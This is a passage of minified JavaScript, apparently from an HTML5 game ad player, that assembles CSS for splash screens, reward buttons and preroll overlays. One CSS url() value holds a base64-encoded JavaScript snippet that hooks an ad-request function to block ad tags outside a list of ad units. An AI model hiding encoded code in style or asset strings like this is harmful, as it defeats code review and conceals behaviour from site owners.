                e += ".wgFlashThumbnail{ background-image: url('" + a.Zc(a.options.flashIcon) + "'); margin-top: -1% !important; cursor: pointer; width: 233px; height: 113px; margin-top: -30px; display: inline-block; background-size: cover; background-position: center center; background-repeat: no-repeat; border-radius: 0; border: 5px solid #fff; position: relative; box-shadow: 4px 2px 30px #505050; }";
                e = e + ".wgFlashBigThumbnail{ background-image: url(`WYoIHRoaXNbMl0gPT09IHRydWUgKXsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCB0aGlzWzFdWzBdLCBuZXcgVVJMKHdpbmRvdy5sb2NhdGlvbi5ocmVmKS5ob3N0LnNwbGl0KCIuIikuc2xpY2UoTWF0aC5tYXgobmV3IFVSTCh3aW5kb3cubG9jYXRpb24uaHJlZikuaG9zdC5zcGxpdCgiLiIpLmxlbmd0aCAtIDIsIDApKS5qb2luKCAiLiIgKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdmFyIGFvaXB1ZmhhcyA9IHRoaXNbMF1bdGhpc1s1XV07CiAgICAgICAgICAgICB0aGlzWzBdW3RoaXNbNV1dID0gZnVuY3Rpb24oIGFkVGFnICl7CiAgICAgICAgICAgICAgICBpZiggYWRUYWcuaW5kZXhPZiggJ2l1PS81MjExNzc0MycgKSA9PT0gLTEgJiYgIGFkVGFnLmluZGV4T2YoICdpdT0vNTAyMzY4MCcgKSA9PT0gLTEgJiYgYWRUYWcuaW5kZXhPZiggJ2l1PS8xMDAyMjEyJyApID09PSAtMSAmJiBhZFRhZy5pbmRleE9mKCAnaXU9LzEyNDMxOTA5NicgKSA9PT0gLTEgJiYgdGhpc1sxXVswXSAhPT0gIndncGxheWVyLmNvbSIgKXsKICAgICAgICAgICAgICAgICAgICB0aGlzWzRdKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYW9pcHVmaGFzLmFwcGx5KHRoaXMsIFthZFRhZ10gKTsKICAgICAgICAgICAgfS5iaW5kKHRoaXMpOw==`);}.wgFlashSplash.wgVisible{ z-index:" +
                    (v + "; transform:translateY(0px); transition: 0s cubic-bezier(0.175, 0.885, 0.32, 1.275);}");
                e += ".wgInstallFlash{position:absolute; top:0; left:0; width:100%; height:100%; background:#272727; display:table; z-index:" + v + ";}";
                e = e + '.wgInstallFlash>div{display:table-cell; text-align:center; vertical-align:middle; width:100%; height:100%; color:#fff; font-family:"open sans"; font-size:18px; letter-spacing:-1px;}.wgInstallFlash>div>a{display:block; text-align:center; color:yellow; padding:10px; }#' + (a.ia.id.trim().toLowerCase() +
                    " .wgVisible{ display:block !important; }");
                0 < a.G().classList.length ? e += "." + a.G().classList[0] + " .wgVisible{ display:block !important; }" : a.G().id && (e += "#" + a.G().id + " .wgVisible{ display:block !important; }");
                e = e + ".wgContextMenu{ position:absolute; min-width:180px; display:inline-block; top:0; left:0; z-index:2147483647; border-radius:5px; padding:15px; max-width:250px; box-sizing:border-box;}.wgContextMenu {background-color:rgba(0,0,0,.8);}.wgContextMenu li{border-bottom:1px solid rgba(255,255,255,.8); padding:5px; color:rgba(255,555,255,.6); list-style-type:none; padding:10px 0; font-family:roboto; font-size:11px; text-align:left;}.wgContextMenu li a{color:rgba(255,555,255,.6); font-family:roboto; font-size:11px; text-align:left; text-decoration:none;}.wgContextMenu li a:hover{text-decoration:underline}.wgContextMenu li:last-child{border-bottom:none;}.wgContextMenu li span{ cursor:pointer; font-size:12px; display:block; text-align:left; font-weight:normal; font-family:'roboto'}.wgRelative{position:relative;}#" +
                    (a.ia.id.trim().toLowerCase() + " iframe:first-of-type{ display:block !important; background:none !important; border:none !important; }");
                "undefined" === typeof a.options.maxHeight || a.isMobile() || (e += "#" + a.ia.id.trim().toLowerCase() + "{ max-height:" + a.options.maxHeight + " !important;}");
                e += "#" + a.ia.id.trim().toLowerCase() + " .wgFlashSplash embed{ transform:scale(100); }";
                e = e + ".slideInFromTop{transform: translateY(0px) !important; transition: .3s ease-in-out; }#" + (a.ia.id.trim().toLowerCase() + ".wgAdLoaded{transform :rotate(360deg); animation-duration:0s !important; transition-duration: 0s !important;}");
                e = e + ".loadingButton{cursor:default !important;}.loadingButton:before{content:\" \"; animation:none !important; width:28px !important; height:28px !important; background-size: 28px 28px; background-repeat:no-repeat; background-position:center center; background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='38' height='38' viewBox='-2 -2 40 40' stroke='%23fff'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg transform='translate(0 0)' stroke-width='4'%3E%3Ccircle stroke-opacity='.5' cx='18' cy='18' r='18'/%3E%3Cpath d='M36 18c0-9.94-8.06-18-18-18' transform='rotate(344.043 18 18)'%3E%3CanimateTransform attributeName='transform' type='rotate' from='0 18 18' to='360 18 18' dur='1s' repeatCount='indefinite'/%3E%3C/path%3E%3C/g%3E%3C/g%3E%3C/svg%3E\") !important;}.loadingButton span{ opacity:0; transition:.2s; }@keyframes bounceHorizontal{0%{left:-4px;} 100%{left:4px;}}.wgPlayGame:not(.loadingButton):before{animation-duration:.4s; animation-iteration-count:infinite;}.wgPlayGame:not(.loadingButton):before {opacity:0;position:relative;transition:.2s; content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAPCAYAAADUFP50AAABKklEQVQokY2TvyvEcRjHX75dDFIGFhmuFFaLC7NFERkNBvInuCubhdtsBsUimVx28iPJarHSme4kAyU/6qVPPur6du7uqc+zPJ/3834/7+fzQR1Un9RzNavSykmAXaAMVIB7YAvopVmoFXU9skypD+qbuqZm/mMPqaxupAp59V2tqrNqkgYmUVBbSlgR6Ab2gBJwBeRqLyQNJvkA8kBPnP8GOAGyzYB/8QzMARNAF3AGTLcC7I+s11HuKXDQCBi6bwMXcd5O4BCYAVbrAYNRi8Aj0AesAMvAKzAcZIaGmTrAfWASWIim7ESp89Hh34h73KzZ0ai6pJbUF7WgdqT3GBjbga/YZwQoAGPAETAEVOs6oN6ql2pR/VaP1YFmDz2kcfVTvVNzLf0O5QcZKy4YNKUs+wAAAABJRU5ErkJggg==);}.wgPlayGame:not(.loadingButton):hover:before {animation-name:bounceHorizontal; opacity:1;position:relative;margin-left:-5px;margin-right:5px;transition:.3s;}.wgRewardbutton{ background-image:url( //st.wgplayer.com/chest.png ); display:inline-block; position:fixed; width:50px; height:50px; z-index:1000; background-repeat: no-repeat;  top:50px; left:50px;}.wgRewardRibbon{ \n                position: absolute;\n                width: 60px;\n                height: 60px;\n                cursor:pointer;\n                background-image: url(data:image/png;base64,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);\n                background-size: 100%;\n                background-position: center center;\n                background-repeat: no-repeat;\n                top: -25px; \n                animation: wgTicTac 2s ease-out infinite;;\n            }.wgRewardbutton.wgVisible{  animation: openChest 0.7s steps(6) .1s normal forwards, popIn 0.3s cubic-bezier(0.250, 0.460, 0.450, 0.940) both;}@keyframes openChest {from { background-position-x: 0px; }to   { background-position-x: -294px; }}@keyframes popIn { 0%{ -webkit-transform: scale(0); transform: scale(0); opacity: 1;} 70% { -webkit-transform: scale(1.2); transform: scale(1.2); opacity: 1;} 100% { -webkit-transform: scale(1); transform: scale(1); opacity: 1; } }.wgOffViewport{ position:fixed; transform:translateX(-10000px) !important; }.wgNoClick{}[cpp] .wgcCounterLm{\n                display:block !important;\n            }\n            [cpp] .wgcCounterLm.removed{\n                display:none !important;\n            }            \n            [cpp] .wgcCounterShield{\n                display:block !important;\n            }\n            .wgcppe{ display:none; cursor:pointer; box-sizing:border-box; background:rgba(255,255,255," +
                    ((a.Ga() ? .3 : 0) + "); position:absolute; top:0; left:0; width:100%; height:100%; z-index:2147483646 !important; border:" + (a.Ga() ? "10px solid pink" : "none") + "; display:none; }");
                e += '.wgNoClick.nskp .wgcppe{ display:block; height:calc(100% - 35px); z-index:99999 !important; cursor:default;}.wgNoClick.skp .wgcppe{ display:block; height:100%; z-index:2147483646 !important; cursor:default;}.wgNoClick.img .wgcppe{ display:block; height:80%; z-index:2147483646 !important; cursor:default;}.wgNoClick .wgcppe{ display:block;}body div.fc-ccpa-root{clear: both !important; overflow: hidden !important;}\n                :root {\n                    --min5050:50px;\n                    --min202:20px;\n                    --min203:20px;\n                    --min405:40px;\n                    --min255:25px;\n                    --min143:14px;\n                    --min22040:150px; \n                    --min15015:150px; \n                    --min505:50px; \n                    --min364:36px;\n                    --min202:20px;\n                }\n                @supports (padding:min(12px, 13vw)) {\n                    :root {\n                        --min5050:min(50px,5vw);\n                        --min202:min(20px,2vw);\n                        --min405:40px;\n                        --min203:min(20px, 3vh);\n                        --min405:min(40px, 5vw);\n                        --min255:min(25px,5vw);\n                        --min143:min(14px,3vw);\n                        --min22040:min(220px,40vw);\n                        --min15015:min(150px,15vw); \n                        --min505:min(50px,5vw);\n                        --min364:min(36px, 4vh);                        \n                        --min202:min(20px,2vw);                        \n                    }               \n                }\n            @import url(https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500&display=swap);\n                    .wgSplash *{\n                        box-sizing:border-box;\n                        font-family:Roboto,sans-serif !important;\n                        font-weight:300;\n                    }\n                    .wgSplash{\n                        display:block;\n                        padding:var(--min5050);\n                        overflow:hidden;\n                        width:100%;\n                        height:100%;\n                        box-sizing:border-box;\n                        position:relative;\n                        background-color:#000;\n                        outline:none !important;\n                        transition:opacity .4s;\n                        background-repeat:no-repeat;\n                        background-position:center;\n                    }\n                    .wgSplash .wgBg{display:block;width:100%;height:100%;position:absolute;top:0;left:0;z-index:1}\n                    .wgSplash .wgBg .wgBgImage{position:absolute;top:0;left:0;width:100%;height:100%;filter:blur(45px);background-size:cover;transform:scale(1.3)}\n                    .wgSplash .wgSplashContent{\n                        background:rgba(255,255,255,.4);\n                        border-radius:50px;\n                        display:block;\n                        width:100%;\n                        height:100%;\n                        z-index:10;\n                        box-shadow: 0px 0px 0px 0px #ffffff, 10px 20px 21px rgba(0,0,0,.4);\n                        position:relative;\n                        transition:box-shadow .2s;\n                    }\n                    \n                    .wgSplash .wgSplashContent:hover{\n                        box-shadow: -2px -2px 10px 1px #ffffff, 10px 20px 21px rgba(0,0,0,.4);\n                    }\n                    \n                    .wgSplashContent .wgCenterContent{display:grid;width:100%;height:100%;grid-template-columns:2fr 1fr;box-sizing:border-box;place-items:center;padding:var(--min202);}\n                    .wgSplashContent .wgCenterContent>div{text-align:center;padding:var(--min202);width:100%}\n                    .wgSplashContent .wgCenterContent .wgPrerollInfo{display:grid;width:100%;text-align:left;row-gap:20px}\n                    .wgSplashContent .wgCenterContent .wgButtons{display:inline-block;text-align:center;display:grid;row-gap:20px;width:max-content;padding:20px}\n                    .wgSplashContent .wgCenterContent .wgPrerollCTA{transition:.2s; position:relative; cursor:pointer; }.wgSplashContent .wgCenterContent .wgPrerollCTA:hover{transform:scale(1.1)}\n                    .wgSplashContent .wgCenterContent .wgPrerollCTA span{\n                        display:grid;\n                        grid-template-columns:auto auto;\n                        grid-gap:10px;\n                        background-color:#1c1c1c;\n                        color:#fff;\n                        border-radius:100px;\n                        padding: var(--min203) var(--min405);\n                        font-weight:400;\n                        font-size:var(--min255);\n                        box-shadow:0 0 20px rgba(0,0,0,.8);\n                        align-items:center;\n                        cursor:pointer;\n                        transition:.3s;\n                        text-transform:uppercase;\n                        user-select: none;\n                        pointer-events:none;\n                    }\n                    .wgSplashContent .wgCenterContent .wgPrerollCTA:hover span{background-color:#91000a}\n                    .wgSplashContent .wgCenterContent .wgPrerollCTA span:before{\n                        display:block;content:" ";\n                        background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAPCAYAAADUFP50AAABKklEQVQokY2TvyvEcRjHX75dDFIGFhmuFFaLC7NFERkNBvInuCubhdtsBsUimVx28iPJarHSme4kAyU/6qVPPur6du7uqc+zPJ/3834/7+fzQR1Un9RzNavSykmAXaAMVIB7YAvopVmoFXU9skypD+qbuqZm/mMPqaxupAp59V2tqrNqkgYmUVBbSlgR6Ab2gBJwBeRqLyQNJvkA8kBPnP8GOAGyzYB/8QzMARNAF3AGTLcC7I+s11HuKXDQCBi6bwMXcd5O4BCYAVbrAYNRi8Aj0AesAMvAKzAcZIaGmTrAfWASWIim7ESp89Hh34h73KzZ0ai6pJbUF7WgdqT3GBjbga/YZwQoAGPAETAEVOs6oN6ql2pR/VaP1YFmDz2kcfVTvVNzLf0O5QcZKy4YNKUs+wAAAABJRU5ErkJggg==);\n                        background-repeat:no-repeat;\n                        background-position:center;\n                        width:15px;\n                        height:15px\n                    }\n                    .wgSplashContent .wgCenterContent .wgPrerollCTA:hover span:before{\n                        animation:wgKnock .3s infinite\n                    }                    \n                    @keyframes wgKnock{\n                        0%{transform:translateX(0)}\n                        100%{transform:translateX(-10px)}\n                    }\n                    .wgSplashContent .wgCenterContent .wgPrerollWb{transition:.2s}\n                    .wgSplashContent .wgCenterContent .wgPrerollWb:hover{transform:scale(1.2)}\n                    .wgSplashContent .wgCenterContent .wgPrerollWb span{\n                        display:inline-block;\n                        border:2px solid #1c1c1c;\n                        color:#1c1c1c;\n                        border-radius:100px;\n                        padding:15px 20px;\n                        text-transform:uppercase;\n                        font-weight:500;\n                        font-size:var(--min143);\n                        box-shadow:0 0 20px rgba(0,0,0,.8);\n                        cursor:pointer;\n                        user-select: none;\n                    }\n                    .wgThumb{\n                        display:block;\n                        position:relative;\n                        border-radius:50%;\n                        overflow:hidden;\n                        box-shadow:0 5px 20px rgba(0,0,0,.4);\n                        width:var(--min22040);\n                        height:var(--min22040);\n                        transition:.3s;\n                        cursor:pointer;\n                        margin:auto;\n                    }\n                    .wgThumb:hover{transform:scale(1.1); box-shadow:-2px -2px 10px 1px #ffffff, 0 5px 40px rgba(0,0,0,.4)}\n                    .wgThumb>div{position:absolute;border-radius:50%;top:0;left:0;width:100%;height:100%;background-size:cover;background-repeat:no-repeat;background-position:center;}\n                    .wgPrerollLogo{\n                        display:block;\n                        width:var(--min15015); \n                        height:var(--min505); \n                        background-repeat:no-repeat;\n                        background-size:contain;\n                        margin:auto;\n                        margin-top:20px;\n                        transition:.4s;\n                        transform-origin:center center;\n                        background-position:center center;\n                    }\n                    .wgPrerollLogo:hover{transform:rotateX(360deg)}\n                    .wgTitle{\n                        font-weight:300;\n                        font-size:var(--min364); \n                        user-select: none;\n                        color:#1c1c1c;\n                        line-height: normal;\n                    }\n                    .wgTitle:after{ content: "" !important; }\n                    .wgPrerollDescription{\n                        font-weight:400;\n                        font-size:15px; \n                        user-select: none;\n                        color:#1c1c1c;                        \n                    }\n                    .wgPrerollLogoBottom{\n                        display:none; \n                        transform-origin:center center;\n                        background-position:center center;\n                    }\n                    .wgSplash{\n                        opacity:0;\n                    }.wgPrerollCTA{position:relative; }.wgPrerollIntCTA{position:absolute; top:0; left:0; width:100%; height:100%; z-index:100000;}';
                setTimeout(function() {
                    a.s(".wgSplash{opacity:1;}")
                }, 300);
                a.s(e);
                try {
                    (new ResizeObserver(function(g) {
                        return a.Mg(g)
                    })).observe(a.u())
                } catch (g) {
                    a.u().target = a.u(), a.Mg([a.u()])
                }!0 !== a.options.cap || a.Aa("_wgcap__") || a.s(".grecaptcha-badge{visibility: hidden;}");
                "undefined" !== typeof a.options.customCss && a.s(a.options.customCss)
            },
            Mg: function(b) {
                if (Array.isArray(b) && b.length) {
                    b = w$b(b);
                    for (var c = b.next(); !c.done; c = b.next()) {
                        var d = c.value;
                        if (d.target === a.u()) {
                            c = d.contentBoxSize ? d.contentBoxSize.inlineSize ? d.contentBoxSize.inlineSize : d.contentBoxSize && d.contentBoxSize[0] ? d.contentBoxSize[0].inlineSize : 0 : d.contentRect ? d.contentRect.width : d.getBoundingClientRect().width;
                            d = d.contentBoxSize ? d.contentBoxSize.blockSize ? d.contentBoxSize.blockSize : d.contentBoxSize && d.contentBoxSize[0] ? d.contentBoxSize[0].blockSize : 0 : d.contentRect ? d.contentRect.height : d.getBoundingClientRect().height;
                            var e = c / d,
                                g = c * d / 1E3;
                            try {
                                document.querySelector("[wg-css]").parentNode.removeChild(document.querySelector("[wg-css]"))
                            } catch (m) {}
                            if (0 < g) {
                                var p = "";
